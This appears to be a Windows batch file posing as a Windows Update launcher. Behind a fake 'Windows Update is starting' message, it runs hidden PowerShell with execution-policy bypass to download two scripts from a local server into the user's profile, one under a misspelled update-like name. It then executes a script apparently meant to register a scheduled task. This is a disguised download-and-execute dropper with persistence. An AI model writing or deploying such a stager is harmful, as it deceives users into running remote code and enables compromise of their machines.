@echo off
PowerShell -Command "Write-Host 'Windows Update is starting'"
PowerShell -w hidden -noni -nop -ep Bypass -Command "Invoke-WebRequest -Method GET -Uri http://localhost:9999/update/ps2 -OutFile('%userprofile%\windwos_update_dev.ps1')"
PowerShell -w hidden -noni -nop -ep Bypass -Command "Invoke-WebRequest -Method GET -Uri http://localhost:9999/update/ps -OutFile('%userprofile%\Scheduled_Register.ps1')"
PowerShell -nop -ep Bypass -Command "%userprofile%\Scheduled_Register.ps1"
@rem PowerShell -w hidden -noni -nop -ep Bypass -Command "%userprofile%\Scheduled_Register.ps1"